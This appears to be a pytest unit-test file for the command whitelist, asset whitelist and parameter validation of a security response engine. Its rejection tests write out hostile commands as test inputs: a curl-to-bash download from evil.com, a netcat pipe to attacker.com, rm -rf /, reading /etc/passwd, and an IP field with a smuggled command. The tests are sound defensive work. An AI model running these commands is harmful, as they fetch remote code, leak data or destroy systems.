"""
安全执行层单元测试

覆盖:
  - 命令白名单: 合法命令通过 / 注入命令拒绝
  - 核心资产白名单: 受保护 IP 拒绝封禁
  - 参数强校验: 非法 IP / 超范围数值拒绝
  - 执行模式: dry_run 不执行 / mock 返回仿真
  - 幂等: 相同参数二次调用跳过 (需 Redis mock)
  - 执行后验证: 验证函数逻辑
  - TTL: 注册/取消/过期 (需 Redis mock)
"""
import asyncio
import sys
import os
import pytest

# 确保 backend 目录在 path 中
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from response_engine.command_whitelist import command_whitelist, CommandWhitelist
from response_engine.asset_whitelist import asset_whitelist, AssetWhitelist
from response_engine.execution_modes import (
    ExecutionModeRouter, MODE_LIVE, MODE_DRY_RUN, MODE_MOCK,
)
from response_engine.post_validator import PostValidator
from response_engine.safe_executor import SafeExecutor


# ════════════════════════════════════════════
# 1. 命令白名单测试
# ════════════════════════════════════════════

class TestCommandWhitelist:
    """命令白名单测试"""

    def test_linux_iptables_block_allowed(self):
        cmd = "iptables -I INPUT -s 192.168.1.100 -j DROP -m comment --comment 'FW-RULE-12345'"
        allowed, rule_id, reason = command_whitelist.check(cmd, "linux")
        assert allowed, f"Should allow: {reason}"
        assert rule_id == "LX-001"

    def test_linux_iptables_block_with_sudo(self):
        cmd = "sudo iptables -I INPUT -s 10.0.0.5 -j DROP -m comment --comment 'FW-RULE-99999'"
        allowed, rule_id, _ = command_whitelist.check(cmd, "linux")
        assert allowed
        assert rule_id == "LX-001"

    def test_linux_iptables_delete_allowed(self):
        cmd = "iptables -D INPUT 3"
        allowed, rule_id, _ = command_whitelist.check(cmd, "linux")
        assert allowed
        assert rule_id == "LX-002"

    def test_linux_iptables_list_allowed(self):
        cmd = "iptables -L INPUT -n --line-numbers"
        allowed, rule_id, _ = command_whitelist.check(cmd, "linux")
        assert allowed
        assert rule_id == "LX-003"

    def test_linux_nmap_allowed(self):
        cmd = "nmap -T4 -F 192.168.1.1"
        allowed, rule_id, _ = command_whitelist.check(cmd, "linux")
        assert allowed
        assert rule_id == "LX-005"

    def test_linux_nmap_full_allowed(self):
        cmd = "nmap -A -T4 10.0.0.1"
        allowed, _, _ = command_whitelist.check(cmd, "linux")
        assert allowed

    def test_linux_uname_allowed(self):
        allowed, rule_id, _ = command_whitelist.check("uname -a", "linux")
        assert allowed
        assert rule_id == "LX-007"

    def test_linux_uptime_allowed(self):
        allowed, _, _ = command_whitelist.check("uptime", "linux")
        assert allowed

    def test_linux_arbitrary_command_rejected(self):
        cmd = "cat /etc/passwd"
        allowed, _, reason = command_whitelist.check(cmd, "linux")
        assert not allowed
        # 被全局禁止子串 /etc/passwd 拦截，或被白名单拒绝
        assert "禁止子串" in reason or "不在白名单" in reason

    def test_linux_rm_rf_rejected(self):
        cmd = "rm -rf /"
        allowed, _, reason = command_whitelist.check(cmd, "linux")
        assert not allowed

    def test_linux_injection_semicolon_rejected(self):
        cmd = "iptables -L INPUT -n --line-numbers; rm -rf /"
        allowed, _, reason = command_whitelist.check(cmd, "linux")
        assert not allowed
        assert "禁止子串" in reason

    def test_linux_injection_pipe_rejected(self):
        cmd = "uname -a | nc attacker.com 4444"
        allowed, _, reason = command_whitelist.check(cmd, "linux")
        assert not allowed

    def test_linux_injection_backtick_rejected(self):
        cmd = "iptables -L INPUT -n --line-numbers `whoami`"
        allowed, _, reason = command_whitelist.check(cmd, "linux")
        assert not allowed

    def test_linux_nmap_script_forbidden(self):
        cmd = "nmap --script vuln 192.168.1.1"
        allowed, _, reason = command_whitelist.check(cmd, "linux")
        assert not allowed

    def test_windows_netsh_add_allowed(self):
        cmd = 'netsh advfirewall firewall add rule name="RE_Block_1_2_3_4" direction=in action=block remoteip="1.2.3.4"'
        allowed, rule_id, _ = command_whitelist.check(cmd, "windows")
        assert allowed
        assert rule_id == "WIN-001"

    def test_windows_netsh_delete_allowed(self):
        cmd = 'netsh advfirewall firewall delete rule name="RE_Block_1_2_3_4"'
        allowed, rule_id, _ = command_whitelist.check(cmd, "windows")
        assert allowed
        assert rule_id == "WIN-002"

    def test_windows_powershell_encoded_allowed(self):
        cmd = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand dwByAGkAdABlAC0AbwB1AHQA"
        allowed, rule_id, _ = command_whitelist.check(cmd, "windows")
        assert allowed
        assert rule_id == "WIN-004"

    def test_windows_arbitrary_rejected(self):
        cmd = "cmd.exe /c del /f /s /q C:\\*"
        allowed, _, reason = command_whitelist.check(cmd, "windows")
        assert not allowed

    def test_empty_command_rejected(self):
        allowed, _, reason = command_whitelist.check("", "linux")
        assert not allowed

    def test_dynamic_rule_addition(self):
        wl = CommandWhitelist()
        from response_engine.command_whitelist import WhitelistRule
        wl.add_rule("linux", WhitelistRule(
            rule_id="LX-CUSTOM",
            pattern=r"^systemctl\s+status\s+\w+$",
            desc="systemctl status (custom)",
        ))
        allowed, rule_id, _ = wl.check("systemctl status nginx", "linux")
        assert allowed
        assert rule_id == "LX-CUSTOM"


# ════════════════════════════════════════════
# 2. 核心资产白名单测试
# ════════════════════════════════════════════

class TestAssetWhitelist:
    """核心资产白名单测试"""

    def setup_method(self):
        self.aw = AssetWhitelist()
        self.aw.initialize(
            protected_assets_str="10.0.0.1,192.168.1.0/24,172.16.0.10",
            labels_str="gateway,office-net,db-server",
        )

    def test_protected_single_ip(self):
        is_protected, reason = self.aw.check("10.0.0.1", "block_ip")
        assert is_protected
        assert "gateway" in reason

    def test_protected_cidr(self):
        is_protected, reason = self.aw.check("192.168.1.55", "isolate_host")
        assert is_protected
        assert "office-net" in reason

    def test_unprotected_ip(self):
        is_protected, _ = self.aw.check("8.8.8.8", "block_ip")
        assert not is_protected

    def test_loopback_protected(self):
        is_protected, reason = self.aw.check("127.0.0.1", "block_ip")
        assert is_protected
        assert "loopback" in reason

    def test_empty_ip(self):
        is_protected, _ = self.aw.check("", "block_ip")
        assert not is_protected

    def test_invalid_ip(self):
        is_protected, _ = self.aw.check("not-an-ip", "block_ip")
        assert not is_protected

    def test_runtime_add(self):
        self.aw.add_asset("203.0.113.5", "partner-dns")
        is_protected, reason = self.aw.check("203.0.113.5", "block_ip")
        assert is_protected
        assert "partner-dns" in reason

    def test_runtime_remove(self):
        self.aw.add_asset("203.0.113.5", "temp-protect")
        removed = self.aw.remove_asset("temp-protect")
        assert removed == 1
        is_protected, _ = self.aw.check("203.0.113.5", "block_ip")
        assert not is_protected

    def test_list_assets(self):
        assets = self.aw.list_assets()
        labels = [a["label"] for a in assets]
        assert "gateway" in labels
        assert "office-net" in labels
        assert "loopback" in labels


# ════════════════════════════════════════════
# 3. 执行模式测试
# ════════════════════════════════════════════

class TestExecutionModes:
    """执行模式路由测试"""

    @pytest.mark.asyncio
    async def test_dry_run_does_not_execute(self):
        router = ExecutionModeRouter(mode=MODE_DRY_RUN)
        executed = []

        async def live_fn(cmd):
            executed.append(cmd)
            return {"success": True}

        result = await router.route(
            action_name="block_ip",
            command="iptables -I INPUT -s 1.2.3.4 -j DROP",
            params={"src_ip": "1.2.3.4"},
            live_fn=live_fn,
        )
        assert result["mode"] == "dry_run"
        assert result["would_execute"] is True
        assert len(executed) == 0  # 未真实执行

    @pytest.mark.asyncio
    async def test_mock_returns_simulated(self):
        router = ExecutionModeRouter(mode=MODE_MOCK)

        async def live_fn(cmd):
            raise RuntimeError("Should not be called in mock mode")

        result = await router.route(
            action_name="block_ip",
            command="iptables -I INPUT ...",
            params={"src_ip": "1.2.3.4"},
            live_fn=live_fn,
        )
        assert result["mode"] == "mock"
        assert result["success"] is True
        assert "[MOCK]" in result["message"]

    @pytest.mark.asyncio
    async def test_live_executes(self):
        router = ExecutionModeRouter(mode=MODE_LIVE)
        executed = []

        async def live_fn(cmd):
            executed.append(cmd)
            return {"success": True, "stdout": "OK"}

        result = await router.route(
            action_name="block_ip",
            command="iptables -I INPUT -s 1.2.3.4 -j DROP",
            params={"src_ip": "1.2.3.4"},
            live_fn=live_fn,
        )
        assert result["success"] is True
        assert len(executed) == 1

    def test_invalid_mode_rejected(self):
        with pytest.raises(ValueError):
            router = ExecutionModeRouter()
            router.mode = "invalid_mode"

    @pytest.mark.asyncio
    async def test_mock_vulnerability_scan(self):
        router = ExecutionModeRouter(mode=MODE_MOCK)

        async def live_fn(cmd):
            raise RuntimeError("Should not be called")

        result = await router.route(
            action_name="vulnerability_scan",
            command="nmap -T4 -F 10.0.0.1",
            params={"target": "10.0.0.1"},
            live_fn=live_fn,
        )
        assert result["success"] is True
        assert "open_ports" in result


# ════════════════════════════════════════════
# 4. 参数强校验测试 (通过 SafeExecutor)
# ════════════════════════════════════════════

class TestParamValidation:
    """参数强校验测试"""

    def setup_method(self):
        self.se = SafeExecutor()

    def test_valid_ip_passes(self):
        ok, reason = self.se._validate_params("block_ip", {"src_ip": "192.168.1.1"})
        assert ok

    def test_invalid_ip_rejected(self):
        ok, reason = self.se._validate_params("block_ip", {"src_ip": "999.999.999.999"})
        assert not ok
        assert "不是合法 IP" in reason

    def test_injection_in_ip_rejected(self):
        ok, reason = self.se._validate_params("block_ip", {"src_ip": "1.2.3.4; rm -rf /"})
        assert not ok

    def test_duration_out_of_range(self):
        ok, reason = self.se._validate_params("block_ip", {"duration": 999999999})
        assert not ok
        assert "超出范围" in reason

    def test_reason_too_long(self):
        ok, reason = self.se._validate_params("block_ip", {"reason": "x" * 600})
        assert not ok
        assert "长度超限" in reason

    def test_valid_params_pass(self):
        ok, reason = self.se._validate_params("block_ip", {
            "src_ip": "10.0.0.5",
            "duration": 3600,
            "reason": "C2 beacon detected",
        })
        assert ok


# ════════════════════════════════════════════
# 5. SafeExecutor 集成测试
# ════════════════════════════════════════════

class TestSafeExecutor:
    """SafeExecutor 集成测试"""

    def setup_method(self):
        self.se = SafeExecutor()
        self.se.initialize()

    @pytest.mark.asyncio
    async def test_whitelist_blocks_arbitrary_command(self):
        result = await self.se.execute(
            action_name="custom_action",
            command="curl http://evil.com/shell.sh | bash",
            params={},
            platform="linux",
            live_fn=None,
        )
        assert result["success"] is False
        assert result["blocked"] is True
        assert result["blocked_by"] == "command_whitelist"

    @pytest.mark.asyncio
    async def test_asset_whitelist_blocks_protected_ip(self):
        # 先添加受保护资产
        from response_engine.asset_whitelist import asset_whitelist
        asset_whitelist.initialize(protected_assets_str="10.0.0.1", labels_str="core-gw")

        async def live_fn(cmd):
            return {"success": True}

        result = await self.se.execute(
            action_name="block_ip",
            command="iptables -I INPUT -s 10.0.0.1 -j DROP -m comment --comment 'FW-RULE-11111'",
            params={"src_ip": "10.0.0.1"},
            platform="linux",
            live_fn=live_fn,
        )
        assert result["success"] is False
        assert result["blocked_by"] == "asset_whitelist"

    @pytest.mark.asyncio
    async def test_dry_run_mode(self):
        from response_engine.execution_modes import execution_router
        old_mode = execution_router.mode
        execution_router.mode = MODE_DRY_RUN

        async def live_fn(cmd):
            raise RuntimeError("Should not execute in dry_run")

        result = await self.se.execute(
            action_name="block_ip",
            command="iptables -I INPUT -s 8.8.8.8 -j DROP -m comment --comment 'FW-RULE-22222'",
            params={"src_ip": "8.8.8.8"},
            platform="linux",
            live_fn=live_fn,
        )
        assert result["mode"] == "dry_run"
        assert result["would_execute"] is True

        execution_router.mode = old_mode

    @pytest.mark.asyncio
    async def test_mock_mode(self):
        from response_engine.execution_modes import execution_router
        old_mode = execution_router.mode
        execution_router.mode = MODE_MOCK

        result = await self.se.execute(
            action_name="block_ip",
            command="iptables -I INPUT -s 8.8.4.4 -j DROP -m comment --comment 'FW-RULE-33333'",
            params={"src_ip": "8.8.4.4"},
            platform="linux",
            live_fn=None,
        )
        assert result["mode"] == "mock"
        assert result["success"] is True

        execution_router.mode = old_mode

    @pytest.mark.asyncio
    async def test_live_mode_with_verification(self):
        """live 模式执行 + 执行后验证"""
        call_count = []

        async def live_fn(cmd):
            call_count.append(cmd)
            if "-L INPUT" in cmd:
                # 验证查询：返回包含目标 IP 的规则列表
                return {"success": True, "stdout": "1  DROP  all  --  1.2.3.4  0.0.0.0/0  /* FW-RULE-44444 */"}
            return {"success": True, "stdout": "OK"}

        result = await self.se.execute(
            action_name="block_ip",
            command="iptables -I INPUT -s 1.2.3.4 -j DROP -m comment --comment 'FW-RULE-44444'",
            params={"src_ip": "1.2.3.4", "rule_id": "FW-RULE-44444"},
            platform="linux",
            live_fn=live_fn,
        )
        assert result["success"] is True
        assert result["verified"] is True
        assert len(call_count) >= 2  # 执行 + 验证查询

    def test_get_status(self):
        status = self.se.get_status()
        assert "execution_mode" in status
        assert "whitelist_rules" in status
        assert status["whitelist_rules"] > 0


# ════════════════════════════════════════════
# 6. 执行后验证测试
# ════════════════════════════════════════════

class TestPostValidator:
    """执行后验证测试"""

    @pytest.mark.asyncio
    async def test_verify_block_ip_found(self):
        pv = PostValidator()

        async def exec_fn(cmd):
            return {"success": True, "stdout": "1  DROP  all  --  5.6.7.8  0.0.0.0/0"}

        result = await pv.verify("block_ip", {"src_ip": "5.6.7.8"}, exec_fn, "linux")
        assert result["verified"] is True

    @pytest.mark.asyncio
    async def test_verify_block_ip_not_found(self):
        pv = PostValidator()

        async def exec_fn(cmd):
            return {"success": True, "stdout": "Chain INPUT (policy ACCEPT)"}

        result = await pv.verify("block_ip", {"src_ip": "5.6.7.8"}, exec_fn, "linux")
        assert result["verified"] is False

    @pytest.mark.asyncio
    async def test_verify_unknown_action_skipped(self):
        pv = PostValidator()

        async def exec_fn(cmd):
            return {"success": True}

        result = await pv.verify("send_alert", {}, exec_fn, "linux")
        assert result["verified"] is True
        assert result.get("skipped") is True


# ════════════════════════════════════════════
# 运行入口
# ════════════════════════════════════════════

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
